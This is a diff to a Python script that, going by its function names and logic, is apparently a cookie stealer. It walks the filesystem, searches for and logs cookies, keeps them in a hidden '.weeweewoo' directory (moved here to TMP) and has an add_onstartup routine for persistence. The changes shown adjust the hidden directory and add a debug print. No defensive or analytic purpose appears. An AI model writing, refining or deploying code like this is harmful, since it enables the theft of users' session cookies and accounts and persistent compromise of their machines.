@@ -2,7 +2,6 @@ from bs4 import BeautifulSoup as htmlparser
 import threading
 import requests
 import sqlite3
-import random
 import shutil
 import time
 import os
@@ -32,19 +31,11 @@ def search_cookie(file_path: "file") -> None:
         return
 
 def create_dir() -> "dirpath":
-    for root, dirs, files in os.walk("/"):
-        for dir_name in dirs:
-            try:
-                if not root.endswith("/"): root = f"{root}/"
-                dir_path = f"{root}{dir_name}"
-                if not dir_path.endswith("/"): dir_path = f"{dir_path}/"
-                dir_path = f"{dir_path}.weeweewoo"
-                if os.path.exists(dir_path):
-                    shutil.rmtree(dir_path)
-                os.mkdir(dir_path)
-                return dir_path
-            except Exception:
-                continue
+    dir_path = f"{os.getenv('TMP')}/.weeweewoo"
+    if os.path.exists(dir_path):
+        shutil.rmtree(dir_path)
+    os.mkdir(dir_path)
+    return dir_path
 
 def log_cookie(cookie: str) -> None:
     data = {
@@ -121,6 +112,7 @@ def add_onstartup() -> None:
 
 def main():
     hidden_dir = create_dir()
+    print(f"DIR: {hidden_dir}")
     sequence = 0
     for root, dirs, files in os.walk("/"):
         for file in files:
